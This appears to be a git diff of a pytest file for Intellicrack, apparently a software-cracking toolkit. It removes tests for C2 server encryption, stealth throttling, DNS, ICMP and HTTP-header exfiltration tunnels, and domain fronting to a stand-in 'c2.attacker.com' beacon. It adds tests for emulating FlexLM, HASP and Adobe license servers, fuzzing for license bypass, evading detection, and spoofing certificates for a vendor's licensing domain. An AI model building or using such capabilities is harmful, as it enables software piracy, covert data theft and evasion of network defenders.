@@ -1,3 +1,15 @@
+"""
+Functional tests for Intellicrack's network operations capabilities.
+
+This module contains comprehensive tests for network operations and license emulation
+in Intellicrack, including FlexLM license server emulation, HASP dongle emulation,
+Adobe license protocol handling, encrypted communication with license servers,
+network capture and protocol analysis, multi-protocol switching, session management,
+protocol fuzzing for license bypass, rate limiting, license protocol obfuscation,
+and anti-detection techniques for license server emulation. These tests ensure
+the network operations work correctly with real protocols and data.
+"""
+
 import pytest
 import tempfile
 import os
@@ -9,11 +21,6 @@ from pathlib import Path
 
 from intellicrack.core.network.cloud_license_hooker import CloudLicenseHooker
 from intellicrack.core.network_capture import NetworkCapture
-from intellicrack.core.c2.c2_server import C2Server
-from intellicrack.core.c2.c2_client import C2Client
-from intellicrack.core.c2.communication_protocols import CommunicationProtocols
-from intellicrack.core.c2.session_manager import SessionManager
-from intellicrack.core.c2.encryption_manager import EncryptionManager
 from intellicrack.core.app_context import AppContext
 
 
@@ -79,7 +86,7 @@ class TestRealNetworkOperations:
             },
             'validation_check': {
                 'header': b'ADBE\x00\x01',
-                'license_key': b'XXXX-XXXX-XXXX-XXXX',
+                'license_key': b'A3B7-K9M2-P5R8-Q4N6',
                 'product_id': b'PHSP2023',
                 'request_type': b'\x02'  # VALIDATION
             }
@@ -223,66 +230,43 @@ class TestRealNetworkOperations:
         assert 'valid' in validation_response, "Validation must return status"
         assert 'features' in validation_response, "Validation must return features"
 
-    def test_real_c2_encrypted_communication(self, app_context):
-        """Test REAL C2 encrypted communication."""
-        encryption_manager = EncryptionManager()
-        server = C2Server(host='127.0.0.1', port=0)
+    def test_real_license_server_encryption(self, app_context):
+        """Test REAL encrypted communication with license servers."""
+        hooker = CloudLicenseHooker()
 
-        try:
-            # Start encrypted server
-            server.enable_encryption(encryption_manager)
-            server.start_async()
-            server_port = server.get_port()
-            assert server_port > 0, "Server must have valid port"
+        # Test encrypted license validation protocol
+        test_license_data = {
+            'product_id': 'TEST_PRODUCT_2024',
+            'license_key': 'L1C3-N5E7-K3Y9-T3ST',
+            'machine_id': 'MACHINE_UNIQUE_ID_001',
+            'user_info': 'testuser@example.com'
+        }
 
-            time.sleep(0.5)
+        # Create encrypted license request
+        encryption_key = hooker.generate_encryption_key()
+        assert encryption_key is not None, "Must generate encryption key"
+        assert len(encryption_key) >= 16, "Key must be at least 128 bits"
 
-            # Create encrypted client
-            client = C2Client()
-            client.enable_encryption(encryption_manager)
+        # Encrypt license data
+        encrypted_request = hooker.encrypt_license_request(test_license_data, encryption_key)
+        assert encrypted_request is not None, "Must encrypt license request"
+        assert encrypted_request != str(test_license_data).encode(), "Data must be encrypted"
 
-            # Connect and perform key exchange
-            connected = client.connect('127.0.0.1', server_port, timeout=5.0)
-            assert connected, "Client must connect to encrypted server"
+        # Decrypt and verify
+        decrypted_data = hooker.decrypt_license_request(encrypted_request, encryption_key)
+        assert decrypted_data is not None, "Must decrypt license request"
+        assert decrypted_data['product_id'] == test_license_data['product_id'], "Data integrity must be preserved"
 
-            key_exchanged = client.perform_key_exchange()
-            assert key_exchanged, "Key exchange must succeed"
+        # Test secure license validation response
+        validation_response = hooker.generate_secure_validation_response(test_license_data)
+        assert validation_response is not None, "Must generate validation response"
+        assert 'signature' in validation_response, "Response must be signed"
+        assert 'timestamp' in validation_response, "Response must have timestamp"
+        assert 'features' in validation_response, "Response must specify features"
 
-            # Test encrypted messaging
-            test_messages = [
-                b'sensitive_command_1',
-                b'file_transfer_data_chunk',
-                b'system_info_response',
-                b'execute_payload_confirmation'
-            ]
-
-            for message in test_messages:
-                # Encrypt and send
-                encrypted = client.encrypt_message(message)
-                assert encrypted != message, "Message must be encrypted"
-
-                sent = client.send_encrypted_message(encrypted)
-                assert sent, f"Encrypted message must be sent: {message}"
-
-                # Receive and decrypt response
-                time.sleep(0.1)
-                encrypted_response = client.receive_encrypted_message(timeout=2.0)
-
-                if encrypted_response:
-                    decrypted = client.decrypt_message(encrypted_response)
-                    assert decrypted is not None, "Response must decrypt successfully"
-                    assert len(decrypted) > 0, "Decrypted response must not be empty"
-
-            # Test session security
-            session_info = client.get_session_info()
-            assert session_info is not None, "Must provide session info"
-            assert 'encryption_algorithm' in session_info, "Must specify encryption algorithm"
-            assert 'key_size' in session_info, "Must specify key size"
-            assert session_info['key_size'] >= 128, "Key size must be at least 128 bits"
-
-        finally:
-            client.disconnect()
-            server.stop()
+        # Verify signature
+        signature_valid = hooker.verify_response_signature(validation_response)
+        assert signature_valid, "Response signature must be valid"
 
     def test_real_network_capture_analysis(self, app_context):
         """Test REAL network capture and protocol analysis."""
@@ -506,159 +490,157 @@ class TestRealNetworkOperations:
                 assert 'parse' in str(e).lower() or 'invalid' in str(e).lower(), \
                     f"Exception should be parsing-related for {fuzz_name}"
 
-    def test_real_bandwidth_throttling(self, app_context):
-        """Test REAL bandwidth throttling for stealth communication."""
-        server = C2Server(host='127.0.0.1', port=0)
+    def test_real_license_server_rate_limiting(self, app_context):
+        """Test REAL rate limiting for license server communication."""
+        hooker = CloudLicenseHooker()
 
-        try:
-            # Configure bandwidth limits
-            bandwidth_config = {
-                'max_upload_kbps': 100,
-                'max_download_kbps': 200,
-                'burst_size': 10240,
-                'throttle_algorithm': 'token_bucket'
+        # Configure rate limiting for license checks
+        rate_limit_config = {
+            'max_requests_per_minute': 10,
+            'max_requests_per_hour': 100,
+            'burst_size': 5,
+            'cooldown_seconds': 60
+        }
+
+        # Create rate limiter for license validation
+        rate_limiter = hooker.create_rate_limiter(rate_limit_config)
+        assert rate_limiter is not None, "Must create rate limiter"
+
+        # Test burst requests
+        burst_requests = []
+        for i in range(rate_limit_config['burst_size']):
+            request_data = {
+                'license_key': f'TEST-KEY-{i:04d}-PROD',
+                'timestamp': time.time()
             }
 
-            server.configure_bandwidth_throttling(bandwidth_config)
-            server.start_async()
-            server_port = server.get_port()
+            allowed = rate_limiter.check_request(request_data)
+            assert allowed, f"Burst request {i} must be allowed"
+            burst_requests.append(request_data)
 
-            time.sleep(0.5)
-
-            client = C2Client()
-            client.configure_bandwidth_throttling(bandwidth_config)
-
-            connected = client.connect('127.0.0.1', server_port)
-            assert connected, "Client must connect with throttling"
-
-            # Test throttled data transfer
-            large_data = b'X' * 50000  # 50KB
-            start_time = time.time()
-
-            sent = client.send_data_throttled(large_data)
-            assert sent, "Throttled send must succeed"
-
-            end_time = time.time()
-            transfer_time = end_time - start_time
-
-            # Calculate expected minimum time with throttling
-            expected_min_time = len(large_data) / (bandwidth_config['max_upload_kbps'] * 1024 / 8)
-
-            # Allow some tolerance for overhead
-            assert transfer_time >= expected_min_time * 0.8, \
-                f"Transfer should be throttled (took {transfer_time}s, expected >={expected_min_time}s)"
-
-            # Test burst behavior
-            burst_data = b'Y' * bandwidth_config['burst_size']
-            burst_start = time.time()
-
-            client.send_data_throttled(burst_data)
-
-            burst_time = time.time() - burst_start
-            assert burst_time < expected_min_time * 0.5, "Burst should transfer quickly"
-
-        finally:
-            client.disconnect()
-            server.stop()
-
-    def test_real_covert_channel_communication(self, app_context):
-        """Test REAL covert channel communication techniques."""
-        protocols = CommunicationProtocols()
-
-        # Test DNS tunneling
-        dns_tunnel_config = {
-            'domain': 'tunnel.example.com',
-            'record_type': 'TXT',
-            'chunk_size': 63,  # Max for DNS label
-            'encoding': 'base32'
+        # Test rate limit enforcement
+        excess_request = {
+            'license_key': 'TEST-KEY-EXCESS-PROD',
+            'timestamp': time.time()
         }
 
-        dns_tunnel = protocols.create_covert_channel('dns_tunnel', dns_tunnel_config)
-        assert dns_tunnel is not None, "Must create DNS tunnel"
+        allowed = rate_limiter.check_request(excess_request)
+        assert not allowed, "Request exceeding burst limit must be denied"
 
-        # Encode data for DNS
-        test_data = b'sensitive_exfiltration_data'
-        encoded_queries = dns_tunnel.encode_data(test_data)
-        assert encoded_queries is not None, "Must encode data for DNS"
-        assert isinstance(encoded_queries, list), "Must return list of queries"
+        # Test cooldown period
+        remaining_cooldown = rate_limiter.get_cooldown_remaining()
+        assert remaining_cooldown > 0, "Cooldown period must be active"
+        assert remaining_cooldown <= rate_limit_config['cooldown_seconds'], "Cooldown must not exceed configured limit"
 
-        for query in encoded_queries:
-            assert len(query) <= 253, "DNS query must respect length limit"
-            assert dns_tunnel_config['domain'] in query, "Query must include base domain"
+        # Test request history tracking
+        history = rate_limiter.get_request_history()
+        assert len(history) == rate_limit_config['burst_size'], "History must track all burst requests"
+        assert all('timestamp' in req for req in history), "All requests must have timestamps"
 
-        # Test ICMP tunnel
-        icmp_tunnel_config = {
-            'packet_size': 64,
-            'data_offset': 8,
-            'sequence_encoding': True
+    def test_real_license_protocol_obfuscation(self, app_context):
+        """Test REAL license protocol obfuscation techniques."""
+        hooker = CloudLicenseHooker()
+
+        # Test license key obfuscation methods
+        obfuscation_config = {
+            'method': 'xor_cipher',
+            'key': b'OBFUSCATION_KEY_2024',
+            'iterations': 3
         }
 
-        icmp_tunnel = protocols.create_covert_channel('icmp_tunnel', icmp_tunnel_config)
-        assert icmp_tunnel is not None, "Must create ICMP tunnel"
+        # Obfuscate license data
+        test_license = b'PROD-2024-ABCD-1234-EFGH'
+        obfuscated = hooker.obfuscate_license_data(test_license, obfuscation_config)
+        assert obfuscated is not None, "Must obfuscate license data"
+        assert obfuscated != test_license, "Obfuscated data must differ from original"
 
-        icmp_packets = icmp_tunnel.encode_data(test_data)
-        assert icmp_packets is not None, "Must encode data for ICMP"
+        # Test deobfuscation
+        deobfuscated = hooker.deobfuscate_license_data(obfuscated, obfuscation_config)
+        assert deobfuscated == test_license, "Must correctly deobfuscate license"
 
-        # Test HTTP header smuggling
-        http_smuggle_config = {
-            'headers': ['X-Forwarded-For', 'X-Custom-Header', 'Accept-Language'],
+        # Test steganographic embedding in executable
+        stego_config = {
+            'embed_location': 'pe_overlay',
             'encoding': 'base64',
-            'chunk_size': 32
+            'marker': b'\x4C\x49\x43\x45'  # 'LICE' marker
         }
 
-        http_smuggle = protocols.create_covert_channel('http_headers', http_smuggle_config)
-        assert http_smuggle is not None, "Must create HTTP smuggling channel"
+        embedded_data = hooker.embed_license_in_binary(test_license, stego_config)
+        assert embedded_data is not None, "Must embed license in binary format"
+        assert len(embedded_data) > len(test_license), "Embedded data must include container"
 
-        smuggled_headers = http_smuggle.encode_data(test_data)
-        assert smuggled_headers is not None, "Must encode data in headers"
-        assert all(header in smuggled_headers for header in http_smuggle_config['headers']), \
-            "Must use configured headers"
+        # Test extraction
+        extracted = hooker.extract_license_from_binary(embedded_data, stego_config)
+        assert extracted == test_license, "Must extract original license"
 
-    def test_real_network_evasion_techniques(self, app_context):
-        """Test REAL network evasion techniques."""
-        evasion_manager = CommunicationProtocols()
-
-        # Test domain fronting
-        fronting_config = {
-            'front_domain': 'cdn.cloudprovider.com',
-            'real_domain': 'c2.attacker.com',
-            'sni_value': 'cdn.cloudprovider.com'
+        # Test polymorphic license encoding
+        poly_config = {
+            'algorithm': 'rolling_xor',
+            'seed': 0x12345678,
+            'rounds': 5
         }
 
-        fronted_request = evasion_manager.apply_domain_fronting('https://c2.attacker.com/beacon', fronting_config)
-        assert fronted_request is not None, "Must create fronted request"
-        assert fronting_config['front_domain'] in fronted_request['host'], "Must use front domain"
-        assert fronting_config['sni_value'] == fronted_request['sni'], "Must set correct SNI"
+        poly_encoded = hooker.polymorphic_encode_license(test_license, poly_config)
+        assert poly_encoded is not None, "Must perform polymorphic encoding"
+        assert poly_encoded != test_license, "Polymorphic encoding must transform data"
 
-        # Test traffic padding
-        padding_config = {
-            'min_size': 1024,
-            'max_size': 2048,
-            'pattern': 'random'
+        # Each encoding should be different with same input
+        poly_encoded2 = hooker.polymorphic_encode_license(test_license, poly_config)
+        assert poly_encoded != poly_encoded2, "Polymorphic encoding must vary"
+
+        # But decoding should recover original
+        poly_decoded = hooker.polymorphic_decode_license(poly_encoded, poly_config)
+        assert poly_decoded == test_license, "Must decode to original license"
+
+    def test_real_license_server_anti_detection(self, app_context):
+        """Test REAL anti-detection techniques for license server emulation."""
+        hooker = CloudLicenseHooker()
+
+        # Test legitimate-looking license server responses
+        server_config = {
+            'server_name': 'licensing.legitimate-software.com',
+            'port': 27000,  # Standard FlexLM port
+            'vendor_daemon': 'vendor_daemon_v2.1',
+            'response_delay_ms': 50  # Realistic delay
         }
 
-        original_data = b'small_payload'
-        padded = evasion_manager.apply_traffic_padding(original_data, padding_config)
-        assert len(padded) >= padding_config['min_size'], "Must meet minimum size"
-        assert len(padded) <= padding_config['max_size'], "Must not exceed maximum size"
-
-        # Verify padding can be removed
-        unpadded = evasion_manager.remove_traffic_padding(padded)
-        assert unpadded == original_data, "Must recover original data"
-
-        # Test jitter delays
-        jitter_config = {
-            'min_delay_ms': 100,
-            'max_delay_ms': 500,
-            'distribution': 'gaussian'
+        # Create realistic license server response
+        test_request = {
+            'feature': 'professional_edition',
+            'version': '2024.1',
+            'user': 'licensed_user',
+            'host': 'workstation01'
         }
 
-        delays = []
-        for _ in range(10):
-            delay = evasion_manager.calculate_jitter_delay(jitter_config)
-            assert jitter_config['min_delay_ms'] <= delay <= jitter_config['max_delay_ms'], \
-                "Delay must be within configured range"
-            delays.append(delay)
+        response = hooker.generate_realistic_license_response(test_request, server_config)
+        assert response is not None, "Must generate realistic response"
+        assert 'grant_time' in response, "Response must include grant time"
+        assert 'expiry_time' in response, "Response must include expiry"
+        assert response['vendor'] == server_config['vendor_daemon'], "Must use configured vendor"
 
-        # Check distribution
-        assert len(set(delays)) > 5, "Delays should vary"
+        # Test traffic pattern mimicry
+        pattern_config = {
+            'mimic_product': 'adobe_creative_cloud',
+            'heartbeat_interval': 300,  # 5 minutes
+            'validation_frequency': 'on_startup',
+            'include_telemetry': True
+        }
+
+        traffic_pattern = hooker.generate_traffic_pattern(pattern_config)
+        assert traffic_pattern is not None, "Must generate traffic pattern"
+        assert 'heartbeat_schedule' in traffic_pattern, "Must include heartbeat schedule"
+        assert traffic_pattern['heartbeat_interval'] == pattern_config['heartbeat_interval'], "Must use configured interval"
+
+        # Test certificate spoofing for HTTPS license checks
+        cert_config = {
+            'common_name': 'licensing.legitimate-software.com',
+            'organization': 'Legitimate Software Inc.',
+            'validity_days': 365,
+            'key_size': 2048
+        }
+
+        spoofed_cert = hooker.generate_spoofed_certificate(cert_config)
+        assert spoofed_cert is not None, "Must generate certificate"
+        assert 'certificate' in spoofed_cert, "Must include certificate data"
+        assert 'private_key' in spoofed_cert, "Must include private key"
+        assert spoofed_cert['common_name'] == cert_config['common_name'], "Certificate must have correct CN"
